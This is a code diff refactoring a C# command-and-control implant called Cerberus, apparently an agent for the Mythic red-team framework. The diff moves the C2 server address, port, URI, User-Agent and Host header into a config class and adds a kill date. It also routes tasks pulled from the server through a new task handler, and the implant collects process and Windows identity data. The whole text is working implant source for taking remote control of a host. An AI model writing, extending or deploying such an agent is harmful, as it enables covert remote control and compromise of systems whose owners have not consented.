@@ -10,6 +10,7 @@ using System.Net;
 using System.Reflection;
 using System.Security.Principal;
 using System.Threading;
+using Tasking;
 
 namespace Cerberus
 {
@@ -17,17 +18,26 @@ namespace Cerberus
     {
         private static CerberusMetadata _metadata;
         private static CommModule _commModule;
+        private static TaskHandler _taskHandler;
         private static CancellationTokenSource _cancellationTokenSource;
 
         private static List<CerberusCommand> _commands = new List<CerberusCommand>();
 
-        private static int SleepTime = 5000;
+        private static int SleepTime = Config.SleepTime;
 
-        private static string serverAddress = "10.0.2.128";
-        private static int serverPort = 80;
-        private static string PayloadUUID = "8f4b9275-fc6e-436d-8e7a-64220c30b609";
+        private static string serverAddress = Config.ServerAddress;
+        private static int serverPort = Config.ServerPort;
+
+        // http params
+        private static string URI = Config.URI;
+        private static string UserAgent = Config.UserAgent;
+        private static string HostHeader = Config.HostHeader;
+
+        private static string PayloadUUID = Config.PayloadUUID;
         private static string UUID = "";
-        private string killdate = "";
+
+        private static string killdateString = Config.killdateString;
+        private static DateTime killdate;
 
 
 
@@ -36,93 +46,54 @@ namespace Cerberus
         static void Main(string[] args)
         {
             //Thread.Sleep(5000);
+            if(DateTime.TryParse(killdateString, out var date))
+            {
+                killdate = date;
+                // dont forget to set defualt val in build params
+            }
+
+
+
+            _taskHandler = new TaskHandler();
 
             GenerateMetadata();
-            LoadCerberusCommands();
+            _taskHandler.Init();
 
-            _commModule = new HttpCommModule(serverAddress, serverPort, SleepTime, _metadata, PayloadUUID);
+            _commModule = new HttpCommModule(serverAddress, serverPort, SleepTime, _metadata, PayloadUUID, URI, UserAgent, HostHeader);
             _commModule.Init(_metadata);
             _commModule.Start();
+            
+            UUID = _commModule.Metadata.uuid;
+
+            
+            
 
             _cancellationTokenSource = new CancellationTokenSource();
 
-            UUID = _commModule.Metadata.uuid;
-
             while (!_cancellationTokenSource.IsCancellationRequested)
             {
-                if (_commModule.RecvData(out var tasks))
+                // check killdate and stop
+                if (DateTime.Now >= killdate)
                 {
-                    HandleTasks(tasks);
+                    Stop();
+                    continue;
                 }
 
-                // check killdate and stop
-            }
-        }
-
-            
-
-        private static void HandleTasks(IEnumerable<MythicTask> tasks)
-        {
-            foreach (var task in tasks)
-            {
-                HandleTask(task);
-            }
-        }
-
-        private static void HandleTask(MythicTask task)
-        {
-            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.command, StringComparison.OrdinalIgnoreCase));
-
-            if (command is null)
-            {
-                var result = new MythicTaskResult
+                if (_taskHandler.InboundEmpty(out var tasks))
                 {
-                    task_id = task.id,
-                    user_output = "Command not found",
-                    completed = true,
-                    status = "error",
-                    error = "Command not found"
-                };
-
-                SendTaskResult(result);
-                return;
+                    _taskHandler.HandleTasks(tasks);
+                }                                
             }
 
-            try
-            {
-                var result = command.Execute(task);
-                SendTaskResult(result);
-            }
-            catch (Exception ex)
-            {
-                var result = new MythicTaskResult
-                {
-                    task_id = task.id,
-                    user_output = ex.Message,
-                    completed = true,
-                    status = "error",
-                    error = ex.Message
-                };
-                SendTaskResult(result);
-            }
+            Environment.Exit(0);
         }
 
-        private static void SendTaskResult(MythicTaskResult result)
-        {
-/*            if (!task.completed)
-            {
-                return;
-            }*/
-
-            _commModule.SendData(result);
-        }
-
-        public void Stop()
+        public static void Stop()
         {
             _cancellationTokenSource.Cancel();
         }
 
-        private static void LoadCerberusCommands()
+        /*private static void LoadCerberusCommands()
         {
             var tasks = Assembly.Load("Tasks");
 
@@ -134,13 +105,13 @@ namespace Cerberus
                     _commands.Add(instance);
                 }
             }
-        }
+        }*/
 
         private static void GenerateMetadata()
         {
             var process = Process.GetCurrentProcess();
             var identity = WindowsIdentity.GetCurrent();
-            /*var principal = new WindowsPrincipal(identity);
+/*          var principal = new WindowsPrincipal(identity);
 
             var integrity = "Medium";
 
